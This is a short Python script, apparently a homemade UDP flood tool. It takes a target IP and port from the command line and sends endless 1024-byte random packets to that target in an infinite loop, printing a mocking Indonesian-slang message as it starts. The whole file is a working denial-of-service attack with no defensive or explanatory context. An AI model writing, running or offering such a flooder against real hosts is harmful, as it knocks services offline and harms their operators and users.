import sys
import socket
import random
from colorama import init, Fore
init()

if len(sys.argv) != 3:
    print(Fore.RED + "Usage: python tes.py ip port")
    sys.exit()

target_ip = sys.argv[1]
target_port = int(sys.argv[2])
message = random._urandom(1024)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print(Fore.RED + "Bang Ini Gw Kasih Kopi  {}:{}...".format(target_ip, target_port))

while True:
    sock.sendto(message, (target_ip, target_port))
